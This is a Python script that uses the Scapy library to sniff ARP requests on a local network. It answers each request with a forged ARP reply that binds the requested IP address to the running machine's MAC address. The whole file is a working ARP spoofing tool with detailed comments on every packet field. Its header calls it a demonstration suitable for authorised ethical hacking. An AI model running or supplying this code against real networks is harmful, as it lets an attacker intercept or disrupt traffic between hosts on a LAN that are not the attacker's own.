#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: August 22 2024
# Description of Script
# This script listens for ARP (Address Resolution Protocol) broadcast requests on the network and
# responds to them, regardless of the IP address requested. It uses the Scapy library to sniff ARP
# requests and then crafts ARP reply packets. The script associates any requested IP address with
# the MAC address of the machine running the script, effectively claiming ownership of that IP.
# This is done by sending a forged ARP reply back to the original requester. The script 
# demonstrates ARP spoofing, often used in network attacks but can also be applied in ethical
# hacking scenarios with proper authorization.
#################################################################################################

from scapy.all import *

# This function will be called every time an ARP request is sniffed
def arp_reply(packet):
    # Check if the packet is an ARP request (ARP op code 1 = who-has)
    if packet.haslayer(ARP) and packet[ARP].op == 1:
        # Create an ARP response packet
        arp_response = ARP(
            # This sets the ARP operation type to "2", which means it's an ARP response (is-at). In ARP, a request (who-has) asks "Who owns this IP address?" and a response (is-at) says "This IP address belongs to this MAC address."
            op=2, 
            # pdst is the destination IP address in this ARP response. The script sets this to the IP address of the machine that originally sent the ARP request. This is done so the response goes back to the correct requester.
            pdst=packet[ARP].psrc,  
            #hwdst is the destination MAC address. This is set to the MAC address of the requester (the machine that sent the ARP request). By setting this, the response will be sent directly to the requesting device.
            hwdst=packet[ARP].hwsrc,  
            # psrc is the source IP address. This is set to the IP address that was being requested in the original ARP request. The ARP response tells the requester that this IP address is "owned" by the machine running this script.
            psrc=packet[ARP].pdst,  
            # hwsrc is the source MAC address, which is set to the MAC address of the machine running the script. This makes it appear as though the machine running the script is the owner of the IP address requested in the ARP request.
            hwsrc=get_if_hwaddr(conf.iface)  # Set the source MAC to our machine's MAC address
        )
        
        # Send the crafted ARP response to the network
        send(arp_response)
        
        # Print out information about the ARP response we've sent
        print(f"Sent ARP reply: {arp_response.psrc} is-at {arp_response.hwsrc}")

# Main function to start sniffing
def main():
    # Start sniffing for ARP packets on the network
    # 'filter="arp"' ensures we only process ARP packets
    # 'prn=arp_reply' tells Scapy to call the arp_reply() function for each packet
    # 'store=0' prevents storing sniffed packets in memory (useful for reducing memory usage)
    sniff(filter="arp", prn=arp_reply, store=0)

# Entry point of the script
if __name__ == "__main__":
    main()
